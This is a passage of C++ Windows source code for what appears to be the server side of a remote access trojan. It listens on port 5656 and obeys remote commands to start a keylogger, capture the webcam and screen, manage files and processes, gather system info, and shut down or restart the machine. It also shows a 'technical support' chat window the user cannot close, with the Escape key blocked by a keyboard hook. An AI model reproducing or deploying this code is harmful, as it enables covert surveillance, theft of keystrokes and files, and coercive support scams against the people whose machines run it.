        hChatHistory = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_BORDER, 10, 10, 360, 300, hwnd, NULL, NULL, NULL);
        hChatInput = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 10, 320, 260, 30, hwnd, NULL, NULL, NULL);
        hBtnSend = CreateWindowW(L"BUTTON", L"Gửi", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 280, 320, 90, 30, hwnd, (HMENU)1, NULL, NULL);
        HFONT hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        SendMessage(hChatHistory, WM_SETFONT, (WPARAM)hFont, TRUE);
        SendMessage(hChatInput, WM_SETFONT, (WPARAM)hFont, TRUE);
        SendMessage(hBtnSend, WM_SETFONT, (WPARAM)hFont, TRUE);
        HMENU hMenu = GetSystemMenu(hwnd, FALSE);
        if (hMenu)
        {
            EnableMenuItem(hMenu, SC_CLOSE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
        }
        oldEditProc = (WNDPROC)SetWindowLongPtrW(hChatInput, GWLP_WNDPROC, (LONG_PTR)EditSubclassProc);
        SetFocus(hChatInput);
        break;
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == 1)
        {
            int len = GetWindowTextLengthW(hChatInput);
            if (len > 0)
            {
                vector<wchar_t> buf(len + 1);
                GetWindowTextW(hChatInput, buf.data(), len + 1);
                wstring txt(buf.data());
                string utf8Msg = "CHAT:[Server]: " + toUtf8(txt.c_str());
                sendLine(utf8Msg);
                appendChatLog(L"[Me]: " + txt);
                SetWindowTextW(hChatInput, L"");
            }
        }
        break;
    case WM_CLOSE:
        ShowWindow(hwnd, SW_HIDE);
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void chatGuiThread()
{
    WNDCLASSW wc = {0};
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"RatChatClass";
    wc.lpfnWndProc = ChatWndProc;
    RegisterClassW(&wc);

    hChatWnd = CreateWindowW(L"RatChatClass", L"Hỗ trợ kỹ thuật",
                             WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                             CW_USEDEFAULT, CW_USEDEFAULT, 400, 400, NULL, NULL, GetModuleHandle(NULL), NULL);

    hBlockHook = SetWindowsHookEx(WH_KEYBOARD_LL, BlockEscProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
}

void chatModule()
{

    if (isGuiRunning && !IsWindow(hChatWnd))
    {
        isGuiRunning = false;
        hChatWnd = NULL;
    }
    if (!isGuiRunning)
    {
        isGuiRunning = true;
        thread gui(chatGuiThread);
        gui.detach();
        while (!hChatWnd)
            Sleep(50);
    }

    string cmd;
    while (true)
    {
        receiveSignal(cmd);

        if (cmd == "START")
        {
            if (hChatWnd)
            {
                ShowWindowAsync(hChatWnd, SW_RESTORE);
                ShowWindowAsync(hChatWnd, SW_SHOW);
                SetWindowPos(hChatWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
                SetWindowPos(hChatWnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
                SetForegroundWindow(hChatWnd);
            }
        }
        else if (cmd.rfind("MSG|", 0) == 0)
        {
            string content = cmd.substr(4);
            int size_needed = MultiByteToWideChar(CP_UTF8, 0, &content[0], (int)content.size(), NULL, 0);
            wstring wstrTo(size_needed, 0);
            MultiByteToWideChar(CP_UTF8, 0, &content[0], (int)content.size(), &wstrTo[0], size_needed);
            appendChatLog(L"[Admin]: " + wstrTo);
        }
        else if (cmd == "QUIT")
        {
            if (hChatWnd)
                ShowWindow(hChatWnd, SW_HIDE);
            return;
        }
    }
}

void processClient(SOCKET client)
{
    clientSocket = client;
    cout << "Client connected!" << endl;

    string s;
    while (true)
    {
        receiveSignal(s);
        if (s == "KEYLOG")
        {
            keylog();
        }
        else if (s == "UNHOOK")
        {
            unhookKey();
            sendLine("Keylogger stopped (Global command).");
        }
        else if (s == "SHUTDOWN")
        {
            shutdown();
        }
        else if (s == "RESTART")
        {
            restart();
        }
        else if (s == "TAKEPIC")
        {
            takepic();
        }
        else if (s == "PROCESS")
        {
            processManagement();
        }
        else if (s == "APPLICATION")
        {
            applicationManagement();
        }
        else if (s == "WEBCAM")
        {
            webcam();
        }
        else if (s == "CHAT")
        {
            chatModule();
        }
        else if (s == "INFO")
        {
            getSystemInfo();
        }
        else if (s == "FILE")
        {
            fileManagement();
        }
        else if (s == "QUIT")
        {
            unhookKey();
            break;
        }
    }
    cout << "Client disconnected." << endl;
}

int main()
{
    SetProcessDPIAware();
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    std::thread(BroadcastServerInfo).detach();

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(5656);

    bind(serverSocket, (sockaddr *)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, 100);

    cout << "Server listening on port 5656..." << endl;

    while (true)
    {
        SOCKET client = accept(serverSocket, NULL, NULL);
        if (client != INVALID_SOCKET)
        {
            processClient(client);
            closesocket(client);
        }
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}
